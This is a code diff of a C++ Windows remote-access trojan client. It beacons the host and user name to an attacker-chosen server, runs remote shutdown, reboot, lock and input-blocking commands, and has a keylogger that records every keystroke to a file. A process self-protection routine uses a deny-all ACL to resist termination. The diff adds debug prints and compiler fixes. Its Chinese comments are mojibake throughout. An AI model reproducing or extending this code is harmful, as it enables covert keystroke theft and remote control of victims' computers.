@@ -1,5 +1,5 @@
-#include"Main.h"
-#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")
+#include"common.h"
+//#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")
 #define MSG_LEN 1024
 #define MSG_LENN 5120
 
@@ -8,26 +8,26 @@ int ServerPort;
 
 void c_socket()
 {
-
-	// ³õÊ¼»¯ Winsock
+	puts("m-1");
+	// åˆå§‹åŒ– Winsock
 	WSADATA wsaData;
-	struct hostent *host;
-	struct in_addr addr;
+	//struct hostent *host;
+	//struct in_addr addr;
 
 	int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
 	if (iResult != NO_ERROR) {
 	}
 
-	// ½¨Á¢socket socket.
+	// å»ºç«‹socket socket.
 	SOCKET client;
 	client = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 	if (client == INVALID_SOCKET) {
-		printf("Error at socket(): %ld\n", WSAGetLastError());
+		printf("Error at socket(): %d\n", WSAGetLastError());
 		WSACleanup();
 		return;
 	}
 
-	//»ñÈ¡Ö÷»úÃû¡¢ÓÃ»§Ãû
+	//è·å–ä¸»æœºåã€ç”¨æˆ·å
 	const int MAX_BUFFER_LEN = 500;
 	char userName[MAX_BUFFER_LEN];
 	char comName[MAX_BUFFER_LEN];
@@ -41,32 +41,36 @@ void c_socket()
 	snprintf(comInfo, sizeof(comInfo), "%s@%s", comName, userName);
 	//sprintf(comInfo, "%s@%s", comName, userName);
 
-	// Á¬½Óµ½·şÎñÆ÷.
+	// è¿æ¥åˆ°æœåŠ¡å™¨.
 	sockaddr_in clientService;
 	clientService.sin_family = AF_INET;
 	clientService.sin_addr.S_un.S_addr = inet_addr(ServerIp);
 	clientService.sin_port = htons(ServerPort);
+	puts("m2");
 	while (1) {
 		if (connect(client, (SOCKADDR*)&clientService, sizeof(clientService)) == SOCKET_ERROR) {
+			puts("m3");
 			Sleep(20000);
 			continue;
 		}
 		else {
+			puts("m4");
 			send(client, comInfo, strlen(comInfo), 0);
 			break;
 		}
 	}
 
-	//×èÈûµÈ´ı·şÎñ¶ËÖ¸Áî
+	puts("m1");
+	//é˜»å¡ç­‰å¾…æœåŠ¡ç«¯æŒ‡ä»¤
 	char recvCmd[MSG_LEN] = { 0 };
 	char message[MSG_LENN + 10] = { 0 };
 	while (1) {
 		ZeroMemory(recvCmd, sizeof(recvCmd));
 		ZeroMemory(message, sizeof(message));
 
-		//´Ó·şÎñ¶Ë»ñÈ¡Êı¾İ
+		//ä»æœåŠ¡ç«¯è·å–æ•°æ®
 		recv(client, recvCmd, MSG_LEN, 0);
-		if (strlen(recvCmd)<1) {  //SOCKETÖĞ¶ÏÖØÁ¬
+		if (strlen(recvCmd)<1) {  //SOCKETä¸­æ–­é‡è¿
 			closesocket(client);
 			while (1) {
 				client = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
@@ -82,39 +86,40 @@ void c_socket()
 			}
 			continue;
 		}
-		else if (strcmp(recvCmd, "shutdown") == 0) {  //¹Ø»ú
+		else if (strcmp(recvCmd, "shutdown") == 0) {  //å…³æœº
 			system("shutdown -s -t 1");
 			continue;
 		}
-		else if (strcmp(recvCmd, "reboot") == 0) {  //ÖØÆô
+		else if (strcmp(recvCmd, "reboot") == 0) {  //é‡å¯
 			system("shutdown -r -t 10");
 			continue;
 		}
-		else if (strcmp(recvCmd, "cancel") == 0) {  //È¡Ïû¹Ø»ú
+		else if (strcmp(recvCmd, "cancel") == 0) {  //å–æ¶ˆå…³æœº
 			system("shutdown -a");
 			continue;
 		}
-		else if (strcmp(recvCmd, "close") == 0) {  //¹Ø±Õ¿Í»§¶Ë
+		else if (strcmp(recvCmd, "close") == 0) {  //å…³é—­å®¢æˆ·ç«¯
 			send(client, "Client has exit!", 16, 0);
 			exit(0);
 		}
-		else if (strcmp(recvCmd, "screenshot") == 0) {  //½ØÆÁ
+		else if (strcmp(recvCmd, "screenshot") == 0) {  //æˆªå±
 			continue;
 		}
-		else if (strcmp(recvCmd, "lock") == 0) { //ËøÆÁ
+		else if (strcmp(recvCmd, "lock") == 0) { //é”å±
 			system("%windir%\\system32\\rundll32.exe user32.dll,LockWorkStation");
 			continue;
 		}
-		else if (strcmp(recvCmd, "blockinput") == 0) { //¶³½áÊó±êºÍ¼üÅÌ
+		else if (strcmp(recvCmd, "blockinput") == 0) { //å†»ç»“é¼ æ ‡å’Œé”®ç›˜
 			BlockInput(true);
 			Sleep(5000);
 			BlockInput(false);
 			continue;
 		}
-		else if (strcmp(recvCmd, "keylogger") == 0)//¼üÅÌ¼ÇÂ¼
+		else if (strcmp(recvCmd, "keylogger") == 0)//é”®ç›˜è®°å½•
 		{
 			char keylog[MAX_PATH];
-			getcwd(keylog, MAX_PATH);
+			GetCurrentDirectoryA(MAX_PATH,keylog);
+			//getcwd(keylog, MAX_PATH);//direct.h not support in mingw
 			string keylogs = keylog;
 			string FileName = keylogs + "\\log.txt";
 			string KeyName = "";
@@ -125,21 +130,21 @@ void c_socket()
 				Sleep(5);
 				for (int i = 8; i <= 255; i++)
 				{
-					if (GetAsyncKeyState(i) & 1 == 1)               //ÅĞ¶ÏĞéÄâ°´¼üÊÇ·ñ°´ÏÂ£¬ÎŞÂÛÊÇÒ»Ö±°´×Å»¹ÊÇ°´Ò»ÏÂ¾Íµ¯Æğ£¬Ö»ÅĞ¶ÏÊÇ·ñ°´¹ı
+					if ((GetAsyncKeyState(i) & 1) == 1)               //åˆ¤æ–­è™šæ‹ŸæŒ‰é”®æ˜¯å¦æŒ‰ä¸‹ï¼Œæ— è®ºæ˜¯ä¸€ç›´æŒ‰ç€è¿˜æ˜¯æŒ‰ä¸€ä¸‹å°±å¼¹èµ·ï¼Œåªåˆ¤æ–­æ˜¯å¦æŒ‰è¿‡
 					{
 						KeyName = GetKeyName(i);
 						FileStream.write(KeyName.c_str(), KeyName.size());
-						FileStream.close();                                //Ğ´ÍêÒ»´Î¾Í±£´æÒ»´Î
+						FileStream.close();                                //å†™å®Œä¸€æ¬¡å°±ä¿å­˜ä¸€æ¬¡
 						FileStream.open(FileName.c_str(), std::fstream::out | std::fstream::app);
 					}
 				}
 
 			}
 		}
-		else if (strcmp(recvCmd, "download") == 0) { //ÉÏ´«ÎÄ¼ş
+		else if (strcmp(recvCmd, "download") == 0) { //ä¸Šä¼ æ–‡ä»¶
 			continue;
 		}
-		else if (strcmp(recvCmd, "upload") == 0) { //ÏÂÔØÎÄ¼ş
+		else if (strcmp(recvCmd, "upload") == 0) { //ä¸‹è½½æ–‡ä»¶
 			continue;
 		}
 		else {
@@ -154,7 +159,8 @@ string GetKeyName(int NumKey)
 {
 	bool IS_SHIFT = JudgeShift();
 	string revalue = "";
-	//ÅĞ¶Ï¼üÅÌÖĞ¼äµÄÌØÊâ·ûºÅ
+	puts("m2");
+	//åˆ¤æ–­é”®ç›˜ä¸­é—´çš„ç‰¹æ®Šç¬¦å·
 	if (NumKey >= 186 && NumKey <= 222)
 		switch (NumKey)
 		{
@@ -229,9 +235,9 @@ string GetKeyName(int NumKey)
 		}
 
 
-	if (NumKey == VK_ESCAPE) // ÍË³ö
+	if (NumKey == VK_ESCAPE) // é€€å‡º
 		revalue = "[Esc]";
-	else if (NumKey == VK_F1) // F1ÖÁF12
+	else if (NumKey == VK_F1) // F1è‡³F12
 		revalue = "[F1]";
 	else if (NumKey == VK_F2)
 		revalue = "[F2]";
@@ -255,49 +261,49 @@ string GetKeyName(int NumKey)
 		revalue = "[F11]";
 	else if (NumKey == VK_F12)
 		revalue = "[F12]";
-	else if (NumKey == VK_SNAPSHOT) // ´òÓ¡ÆÁÄ»
+	else if (NumKey == VK_SNAPSHOT) // æ‰“å°å±å¹•
 		revalue = "[PrScrn]";
-	else if (NumKey == VK_SCROLL) // ¹ö¶¯Ëø¶¨
+	else if (NumKey == VK_SCROLL) // æ»šåŠ¨é”å®š
 		revalue = "[Scroll Lock]";
-	else if (NumKey == VK_PAUSE) // ÔİÍ£¡¢ÖĞ¶Ï
+	else if (NumKey == VK_PAUSE) // æš‚åœã€ä¸­æ–­
 		revalue = "[Pause]";
-	else if (NumKey == VK_CAPITAL) // ´óĞ´Ëø¶¨
+	else if (NumKey == VK_CAPITAL) // å¤§å†™é”å®š
 		revalue = "[Caps Lock]";
-	else if (NumKey == 8) //<- »Ø¸ñ¼ü
+	else if (NumKey == 8) //<- å›æ ¼é”®
 		revalue = "[Backspace]";
-	else if (NumKey == VK_RETURN) // »Ø³µ¼ü¡¢»»ĞĞ
+	else if (NumKey == VK_RETURN) // å›è½¦é”®ã€æ¢è¡Œ
 		revalue = "[Enter]\n";
-	else if (NumKey == VK_SPACE) // ¿Õ¸ñ
+	else if (NumKey == VK_SPACE) // ç©ºæ ¼
 		revalue = " ";
-	else if (NumKey == VK_TAB) // ÖÆ±í¼ü
+	else if (NumKey == VK_TAB) // åˆ¶è¡¨é”®
 		revalue = "[Tab]";
-	else if (NumKey == VK_LCONTROL) // ×ó¿ØÖÆ¼ü
+	else if (NumKey == VK_LCONTROL) // å·¦æ§åˆ¶é”®
 		revalue = "[Ctrl]";
-	else if (NumKey == VK_RCONTROL) // ÓÒ¿ØÖÆ¼ü
+	else if (NumKey == VK_RCONTROL) // å³æ§åˆ¶é”®
 		revalue = "[CTRL]";
-	else if (NumKey == VK_LMENU) // ×ó»»µµ¼ü
+	else if (NumKey == VK_LMENU) // å·¦æ¢æ¡£é”®
 		revalue = "[Alt]";
-	else if (NumKey == VK_LMENU) // ÓÒ»»µµ¼ü
+	else if (NumKey == VK_LMENU) // å³æ¢æ¡£é”®
 		revalue = "[ALT]";
-	else if (NumKey == VK_LWIN) // ÓÒ WINDOWS ¼ü
+	else if (NumKey == VK_LWIN) // å³ WINDOWS é”®
 		revalue = "[Win]";
-	else if (NumKey == VK_RWIN) // ÓÒ WINDOWS ¼ü
+	else if (NumKey == VK_RWIN) // å³ WINDOWS é”®
 		revalue = "[WIN]";
-	else if (NumKey == VK_APPS) // ¼üÅÌÉÏ ÓÒ¼ü
-		revalue = "ÓÒ¼ü";
-	else if (NumKey == VK_INSERT) // ²åÈë
+	else if (NumKey == VK_APPS) // é”®ç›˜ä¸Š å³é”®
+		revalue = "å³é”®";
+	else if (NumKey == VK_INSERT) // æ’å…¥
 		revalue = "[Insert]";
-	else if (NumKey == VK_DELETE) // É¾³ı
+	else if (NumKey == VK_DELETE) // åˆ é™¤
 		revalue = "[Delete]";
-	else if (NumKey == VK_HOME) // ÆğÊ¼
+	else if (NumKey == VK_HOME) // èµ·å§‹
 		revalue = "[Home]";
-	else if (NumKey == VK_END) // ½áÊø
+	else if (NumKey == VK_END) // ç»“æŸ
 		revalue = "[End]";
-	else if (NumKey == VK_PRIOR) // ÉÏÒ»Ò³
+	else if (NumKey == VK_PRIOR) // ä¸Šä¸€é¡µ
 		revalue = "[PgUp]";
-	else if (NumKey == VK_NEXT) // ÏÂÒ»Ò³
+	else if (NumKey == VK_NEXT) // ä¸‹ä¸€é¡µ
 		revalue = "[PgDown]";
-	// ²»³£ÓÃµÄ¼¸¸ö¼ü:Ò»°ã¼üÅÌÃ»ÓĞ
+	// ä¸å¸¸ç”¨çš„å‡ ä¸ªé”®:ä¸€èˆ¬é”®ç›˜æ²¡æœ‰
 	else if (NumKey == VK_CANCEL) // Cancel
 		revalue = "[Cancel]";
 	else if (NumKey == VK_CLEAR) // Clear
@@ -310,17 +316,17 @@ string GetKeyName(int NumKey)
 		revalue = "[Execute]";
 
 	//----------------------------------------//
-	else if (NumKey == VK_LEFT) //ÉÏ¡¢ÏÂ¡¢×ó¡¢ÓÒ¼ü
-		revalue = "[¡û]";
+	else if (NumKey == VK_LEFT) //ä¸Šã€ä¸‹ã€å·¦ã€å³é”®
+		revalue = "[â†]";
 	else if (NumKey == VK_RIGHT)
-		revalue = "[¡ú]";
+		revalue = "[â†’]";
 	else if (NumKey == VK_UP)
-		revalue = "[¡ü]";
+		revalue = "[â†‘]";
 	else if (NumKey == VK_DOWN)
-		revalue = "[¡ı]";
-	else if (NumKey == VK_NUMLOCK)//Ğ¡¼üÅÌÊıÂëËø¶¨
+		revalue = "[â†“]";
+	else if (NumKey == VK_NUMLOCK)//å°é”®ç›˜æ•°ç é”å®š
 		revalue = "[NumLock]";
-	else if (NumKey == VK_ADD) // ¼Ó¡¢¼õ¡¢³Ë¡¢³ı
+	else if (NumKey == VK_ADD) // åŠ ã€å‡ã€ä¹˜ã€é™¤
 		revalue = "+";
 	else if (NumKey == VK_SUBTRACT)
 		revalue = "-";
@@ -328,9 +334,9 @@ string GetKeyName(int NumKey)
 		revalue = "*";
 	else if (NumKey == VK_DIVIDE)
 		revalue = "/";
-	else if (NumKey == 190 || NumKey == 110) // Ğ¡¼üÅÌ . ¼°¼üÅÌ .
+	else if (NumKey == 190 || NumKey == 110) // å°é”®ç›˜ . åŠé”®ç›˜ .
 		revalue = ".";
-	//Ğ¡¼üÅÌÊı×Ö¼ü:0-9
+	//å°é”®ç›˜æ•°å­—é”®:0-9
 	else if (NumKey == VK_NUMPAD0)
 		revalue = "0";
 	else if (NumKey == VK_NUMPAD1)
@@ -351,7 +357,7 @@ string GetKeyName(int NumKey)
 		revalue = "8";
 	else if (NumKey == VK_NUMPAD9)
 		revalue = "9";
-	//----------------------------ÉÏÊö´úÂëÅĞ¶Ï¼üÅÌÉÏ³ıÁË×ÖÄ¸Ö®ÍâµÄ¹¦ÄÜ¼ü--------------------------------//
+	//----------------------------ä¸Šè¿°ä»£ç åˆ¤æ–­é”®ç›˜ä¸Šé™¤äº†å­—æ¯ä¹‹å¤–çš„åŠŸèƒ½é”®--------------------------------//
 	else if (NumKey >= 65 && NumKey <= 90)
 	{
 		if (GetKeyState(VK_CAPITAL))
@@ -369,7 +375,7 @@ string GetKeyName(int NumKey)
 				revalue = NumKey + 32;
 		}
 	}
-	//---------------------------ÉÏÃæµÄ²¿·ÖÅĞ¶Ï¼üÅÌÉÏµÄ×ÖÄ¸----------------------------------------------//
+	//---------------------------ä¸Šé¢çš„éƒ¨åˆ†åˆ¤æ–­é”®ç›˜ä¸Šçš„å­—æ¯----------------------------------------------//
 	else if (NumKey >= 48 && NumKey <= 57)
 	{
 		if (IS_SHIFT)
@@ -410,8 +416,8 @@ string GetKeyName(int NumKey)
 
 bool JudgeShift()
 {
-	int iShift = GetKeyState(0x10); //ÅĞ¶ÏShift¼ü×´Ì¬
-	bool IS = (iShift & KeyBoardValue) == KeyBoardValue; //±íÊ¾°´ÏÂShift¼ü
+	int iShift = GetKeyState(0x10); //åˆ¤æ–­Shifté”®çŠ¶æ€
+	bool IS = (iShift & KeyBoardValue) == KeyBoardValue; //è¡¨ç¤ºæŒ‰ä¸‹Shifté”®
 	if (IS)
 		return 1;
 	else
@@ -421,35 +427,40 @@ bool JudgeShift()
 
 BOOL Ring3ProtectProcess()
 {
-	HANDLE hProcess = ::GetCurrentProcess();
+	HANDLE 		hProcess;
 	SID_IDENTIFIER_AUTHORITY sia = SECURITY_WORLD_SID_AUTHORITY;
-	PSID pSid;
-	BOOL bSus = FALSE;
-	bSus = ::AllocateAndInitializeSid(&sia, 1, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, &pSid);
-	if (!bSus) goto Cleanup;
-	HANDLE hToken;
+	PSID 		pSid;
+	BOOL 		bSus = FALSE;
+	HANDLE 		hToken;
+	DWORD 		dwReturnLength;
+	LPVOID 		TokenInformation;
+	PTOKEN_USER 	pTokenUser;
+	BYTE 		Buf[0x200];
+	PACL 		pAcl;
+DWORD dw;
+
+	hProcess = ::GetCurrentProcess();
+	bSus = ::AllocateAndInitializeSid(&sia, 1, 0, 0, 0, 0, 0, 0, 0, 0, &pSid);
+	if (!bSus) goto cleanup;
 	bSus = ::OpenProcessToken(hProcess, TOKEN_QUERY, &hToken);
-	if (!bSus) goto Cleanup;
-	DWORD dwReturnLength;
-	::GetTokenInformation(hToken, TokenUser, NULL, NULL, &dwReturnLength);
-	if (dwReturnLength > 0x400) goto Cleanup;
-	LPVOID TokenInformation;
-	TokenInformation = ::LocalAlloc(LPTR, 0x400);//ÕâÀï¾ÍÒıÓÃSDKµÄº¯Êı²»ÒıÓÃCRTµÄÁË  
-	DWORD dw;
+	if (!bSus) goto cleanup;
+	::GetTokenInformation(hToken, TokenUser, NULL, 0, &dwReturnLength);
+	if (dwReturnLength > 0x400) goto cleanup;
+	TokenInformation = ::LocalAlloc(LPTR, 0x400);//è¿™é‡Œå°±å¼•ç”¨SDKçš„å‡½æ•°ä¸å¼•ç”¨CRTçš„äº†  
 	bSus = ::GetTokenInformation(hToken, TokenUser, TokenInformation, 0x400, &dw);
-	if (!bSus) goto Cleanup;
-	PTOKEN_USER pTokenUser = (PTOKEN_USER)TokenInformation;
-	BYTE Buf[0x200];
-	PACL pAcl = (PACL)&Buf;
+	if (!bSus) goto cleanup;
+	pTokenUser = (PTOKEN_USER)TokenInformation;
+	pAcl = (PACL)&Buf;
 	bSus = ::InitializeAcl(pAcl, 1024, ACL_REVISION);
-	if (!bSus) goto Cleanup;
+	if (!bSus) goto cleanup;
 	bSus = ::AddAccessDeniedAce(pAcl, ACL_REVISION, 0xFFFFFFFF, pSid);
-	if (!bSus) goto Cleanup;
+	if (!bSus) goto cleanup;
 	bSus = ::AddAccessAllowedAce(pAcl, ACL_REVISION, 0x00100701, pTokenUser->User.Sid);
-	if (!bSus) goto Cleanup;
+	if (!bSus) goto cleanup;
 	if (::SetSecurityInfo(hProcess, SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION | PROTECTED_DACL_SECURITY_INFORMATION, NULL, NULL, pAcl, NULL) == 0)
 		bSus = TRUE;
-Cleanup:
+
+cleanup:
 	if (hProcess != NULL)
 		::CloseHandle(hProcess);
 	if (pSid != NULL)
@@ -460,7 +471,7 @@ Cleanup:
 
 int main(int argc, char** argv)
 {
-	Ring3ProtectProcess();
+	//Ring3ProtectProcess();
 	ServerIp = argv[1];
 	ServerPort = atoi(argv[2]);
 	//starting();
